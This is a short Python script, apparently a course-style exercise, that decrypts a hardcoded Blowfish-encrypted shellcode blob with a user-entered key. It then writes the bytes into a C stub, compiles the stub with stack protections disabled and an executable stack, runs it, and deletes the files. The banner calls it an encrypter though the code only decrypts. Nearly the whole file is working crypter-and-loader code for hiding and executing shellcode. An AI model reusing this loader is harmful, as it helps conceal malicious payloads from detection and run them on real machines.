#!/usr/bin/env python3

import blowfish
import sys
import os
from ctypes import *

print("***********************************************************************************")
print("**********************  BLOWFISH SHELLCODE ENCRYPTER  *****************************")
print("")
print("*    Created By          :       Sandeep Singh Sethi                              *")
print("*    Purpose             :   Used to encrypt the shellcode with blowfish !        *")
print("")
print("**********************                                *****************************")
print("***********************************************************************************")
print()


crypted_shellcode = b"\xf3\x72\x0a\x2f\x95\x22\x91\x20\xc7\x99\xe4\x46\xe7\x59\xba\x0c\xbd\xd2\x6c\x4e\x93\x89\x70\x7a"

byte_crypted_shellcode = bytearray(crypted_shellcode)

decrypted_shellcode = b""

key = input("Enter the key for the decryption of the shellcode : \n")

if len(key) < 4 or len(key) > 56:
    print("Invalid key length : Key must be between 4 - 56 characters , current key size doesn't met the requirements for the required key")
    sys.exit(1)

cipher = blowfish.Cipher(key.encode())


l = ((len(byte_crypted_shellcode)) / 8) + 1
i = 1
p = 0

while i < l:
    block = byte_crypted_shellcode[p:8*i]
    decrypted_shellcode += cipher.decrypt_block(block)
    i += 1
    p += 8


crypted = ""

for x in bytearray(byte_crypted_shellcode):
    crypted += "\\x%02x" % x

uncrypted = ""

for x in bytearray(decrypted_shellcode):
    uncrypted += "\\x%02x" % x



print("o-o" * 30)
print()
print("-" * 80)
print("Encrypted Shellcode : ")
print(crypted)
print()
print("-" * 80)
print("Decrypted Shellcode : ")
print(uncrypted)
print()
print("-" * 80)
print("Encryption Key : ")
print(key)
print()
print("-" * 80)
print("Shellcode length after the padding : ",len(bytearray(crypted_shellcode)))
print("-" * 80)
print("o-o" * 30)


print("")
print("Executing the shellcode after decrypting it !!")


file = open("sh.c","w")
file.write('''
            #include <stdio.h>

            int main(){
                unsigned char code[] = \"''' + uncrypted + '''";     
                int (*ret)() = (int(*)())code;
                ret();
                return 0;
            }
    
        ''')

file.close()
os.system("gcc -m32 -fno-stack-protector -z execstack -o sh sh.c")
os.system("./sh")
os.system("rm sh sh.c")
